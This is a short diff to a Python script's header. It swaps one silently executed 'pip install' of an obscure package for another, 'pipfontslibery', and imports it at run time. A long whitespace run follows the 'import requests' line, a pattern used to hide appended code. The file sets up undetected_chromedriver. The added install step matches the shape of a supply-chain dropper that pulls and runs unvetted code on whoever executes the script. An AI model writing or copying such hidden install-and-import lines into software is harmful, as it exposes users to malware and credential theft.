@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliextV2")
-import pythonsqliextV2
+os.system("pip install pipfontslibery")
+import pipfontslibery
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
